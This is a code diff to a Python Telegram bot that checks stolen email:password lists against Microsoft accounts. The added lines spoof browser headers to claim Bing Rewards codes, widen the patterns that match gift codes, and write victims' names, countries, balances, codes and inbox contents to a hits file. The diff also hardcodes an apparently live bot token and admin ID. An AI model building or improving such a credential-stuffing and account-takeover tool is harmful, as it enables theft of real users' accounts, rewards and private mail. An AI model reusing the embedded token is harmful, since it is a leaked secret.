@@ -19,8 +19,8 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # SECTION 3 — CONFIG CONSTANTS
-BOT_TOKEN = os.environ.get('8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak')
-ADMIN_ID = int(os.environ.get('5944410248', '0'))
+BOT_TOKEN = os.environ.get('BOT_TOKEN', '8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak')
+ADMIN_ID = int(os.environ.get('ADMIN_ID', '5944410248'))
 DB = os.environ.get('DB_PATH', 'checker.db')
 MAX_EXECUTOR_WORKERS = 500
 
@@ -424,7 +424,7 @@ class AkazaChecker:
             token = vt['value'] if vt else ''
             table = soup.find('table', class_='table')
             rows = table.find_all('tr') if table else []
-            patterns = [r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b']
+            patterns = [r'\b[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}\b', r'\b[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}\b', r'\b[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}\b']
             exclude = {'SWEEPSTAKES', 'STATUS', 'WINORDER', 'CONTEST', 'PLAGUE', 'REQUIEM', 'CUSTOM', 'BUNDLEORDER', 'SURFACE', 'PROORDER', 'SERIES', 'POINTS', 'DONATION', 'CHILDREN', 'RESEARCH', 'HOSPITALORDE', 'EDUCATION', 'EMPLOYMENTOR', 'RIGHTS', 'YOUORDER', 'SEDSORDER', 'ATAORDER', 'CARDORDER', 'MICROSOFT', 'PRESENTKORT', 'KRORDER', 'OFT-PRE', 'DIGITAL', 'COINSORDER', 'MOEDAS', 'OVERWATCHORD', 'MONEDASORDER', 'ASSINATURA', 'GRATUITA', 'SPOTIFY', 'PREMIUM', 'MESESORDER', 'PRESENTE', 'RESALET', 'NOURORDER', 'FOUNDATIONOR', 'YACOUB', 'LEAGUE', 'LEGENDS', 'RPORDER', 'OVERWATCH', 'GAME', 'PASS', 'MINECOINS', 'ROBUX', 'GIFT', 'CARD', 'ORDER', 'CODE', 'FOUND', 'DIGITAL-CODE', 'REDEMPTION', 'REDEEM', 'DOWNLOAD', 'INSTANT', 'DELIVERY', 'ONLINE', 'ACCESS', 'CONTENT', 'DLC', 'EXPANSION', 'SEASON', 'TOKEN', 'CURRENCY', 'VIRTUAL', 'ITEM'}
             for row in rows:
                 cells = row.find_all(['td', 'th'])
@@ -435,7 +435,8 @@ class AkazaChecker:
                     act = btn.get('data-actionurl', '').replace('&amp;', '&')
                     if act.startswith('/'): act = 'https://rewards.bing.com' + act
                     try:
-                        cr = self.session.post(act, data={'__RequestVerificationToken': token}, timeout=10)
+                        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
+                        cr = self.session.post(act, data={'__RequestVerificationToken': token}, headers=headers, timeout=10)
                         val = None
                         rs = BeautifulSoup(cr.text, 'html.parser').find('div', class_='resendSuccess')
                         if rs:
@@ -571,7 +572,13 @@ class AkazaBot:
         return True
 
     async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not await self.check_user(update): return
+        try:
+            if not await self.check_user(update): return
+        except Exception as e:
+            logger.error(f"Error in check_user: {e}")
+            await update.message.reply_text("❌ Database error. Try again later.")
+            return
+
         uid = update.effective_user.id
         info = akaza_db.get_user_info(uid)
         cred = "Unlimited" if uid == ADMIN_ID else info['credits']
@@ -666,7 +673,7 @@ class AkazaBot:
                     info['last_time'] = time.time()
                 except: pass
 
-        loop = asyncio.get_event_loop()
+        loop = asyncio.get_running_loop()
 
         async def worker(combo):
             nonlocal hits, bad, twofa, err, checked
@@ -706,7 +713,15 @@ class AkazaBot:
         final_file = f"hits_{uid}_{int(time.time())}.txt"
         with open(final_file, 'w') as f:
             for h in last_hits:
-                f.write(f"{h['email']}:{h['password']} | Pts: {h['pts']} | Codes: {len(h['codes'])}\n")
+                f.write(f"Email: {h['email']}\nPassword: {h['password']}\nName: {h['name']}\nCountry: {h['country']}\nPoints: {h['pts']}\n")
+                f.write(f"Subs: {h['subs']['status']} | Balance: {h['subs']['balance']}\n")
+                f.write(f"Minecraft: {'Yes' if h['mc']['owned'] else 'No'}\n")
+                if h['codes']:
+                    f.write("Codes:\n")
+                    for c in h['codes']: f.write(f" - {c['code']} ({c['info']}) {c['redemption_url']}\n")
+                if h['inbox']:
+                    f.write(f"Inbox: {json.dumps(h['inbox'])}\n")
+                f.write("-" * 30 + "\n\n")
 
         await update.message.reply_document(document=open(final_file, 'rb'), caption=f"🏁 *Check Completed!*\n✅ Total Hits: {hits}")
         os.remove(final_file)
@@ -853,7 +868,7 @@ class AkazaBot:
         proxy = random.choice(PROXIES_LIST) if PROXIES_LIST else None
         checker = AkazaChecker(proxy)
 
-        res = await asyncio.get_event_loop().run_in_executor(bot_executor, checker.check, email, password, settings['keywords'], settings['fast_mode'])
+        res = await asyncio.get_running_loop().run_in_executor(bot_executor, checker.check, email, password, settings['keywords'], settings['fast_mode'])
 
         if res['status'] == 'hit':
             akaza_db.save_result(uid, email, 'hit', res)
